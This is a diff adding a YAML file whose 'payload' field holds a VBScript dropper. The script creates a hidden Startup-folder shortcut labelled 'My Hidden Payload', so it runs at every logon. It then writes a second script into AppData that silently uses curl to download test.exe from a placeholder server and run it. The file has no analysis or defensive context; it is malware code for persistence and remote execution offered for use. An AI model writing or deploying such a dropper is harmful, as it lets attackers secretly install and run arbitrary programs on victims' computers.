@@ -1,0 +1,41 @@
+payload:
+  vbs_script: |
+    Set objShell = CreateObject("WScript.Shell")
+    Set objFSO = CreateObject("Scripting.FileSystemObject")
+
+    ' Get the path to the current user's Startup folder
+    StartupFolder = objShell.SpecialFolders("Startup")
+
+    ' Path for the VBS script to be created in the Startup folder
+    ShortcutPath = StartupFolder & "\MyApp.lnk"
+
+    ' Create the shortcut
+    Set objShortcut = objShell.CreateShortcut(ShortcutPath)
+
+    ' Command to execute the payload silently
+    objShortcut.TargetPath = "wscript.exe"
+    objShortcut.Arguments = Chr(34) & objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Roaming\test.vbs" & Chr(34)
+
+    ' Set the shortcut window style to hidden (no window visible)
+    objShortcut.WindowStyle = 7 ' 7 corresponds to hidden window
+
+    ' Optionally, add a description for the shortcut
+    objShortcut.Description = "My Hidden Payload"
+
+    ' Save the shortcut
+    objShortcut.Save
+
+    ' Get the correct AppData\Roaming folder path
+    appDataPath = objShell.ExpandEnvironmentStrings("%APPDATA%")
+    vbsFolder = appDataPath & "\Roaming"
+
+    ' Ensure the directory exists, create it if it doesn't
+    If Not objFSO.FolderExists(vbsFolder) Then
+        objFSO.CreateFolder(vbsFolder)
+    End If
+
+    ' Create the VBS script that will download and run the test.exe
+    Set objVBSFile = objFSO.CreateTextFile(vbsFolder & "\test.vbs", True)
+    objVBSFile.WriteLine("Set objShell = CreateObject(""WScript.Shell"")")
+    objVBSFile.WriteLine("objShell.Run ""cmd /c curl -o %TEMP%\test.exe "SERVERNAME/test.exe" && %TEMP%\test.exe"", 0, True")
+    objVBSFile.Close
